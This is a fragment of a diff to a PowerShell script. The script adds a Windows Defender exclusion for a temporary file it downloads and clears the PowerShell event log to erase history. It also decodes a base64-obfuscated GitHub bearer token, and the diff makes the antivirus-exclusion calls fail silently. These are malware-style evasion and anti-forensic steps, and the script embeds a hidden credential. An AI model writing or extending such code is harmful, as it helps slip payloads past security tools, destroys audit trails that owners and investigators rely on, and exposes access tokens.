@@ -28,7 +28,7 @@ Ensure-RunAsAdmin
 function ClrHistory {
     try {
         Write-Host "Clearing logs and history..." -ForegroundColor Green
-        Remove-MpPreference -ExclusionPath $contFile
+        Remove-MpPreference -ExclusionPath $contFile -ErrorAction Ignore
         # Очистка журнала PowerShell
         if (Get-EventLog -LogName "Windows PowerShell" -ErrorAction SilentlyContinue) {
             Clear-EventLog -LogName "Windows PowerShell" -ErrorAction Stop
@@ -66,7 +66,7 @@ $temp = $env:TEMP
 try {
     Write-Host "Download..." -ForegroundColor Green
     $contFile = [System.IO.Path]::GetTempFileName()
-	Add-MpPreference -ExclusionPath $contFile
+	Add-MpPreference -ExclusionPath $contFile -ErrorAction Ignore
     try {
 		$String = "QmVhcmVyIGdpdGh1Yl9wYXRfMTFCSkVOSDRJMGRZWjNVeTJtWnNxTl9PWVVNWVdkcGdTWHJybk43V3pDbjIwbkVlUm5zRTVvYVVQWlJSclpsd3hWQ1hHNktGNlFOR2p0aWhMdw=="
 		$String = [System.Text.Encoding]::UTF8.GetString([Convert]::FromBase64String($String))
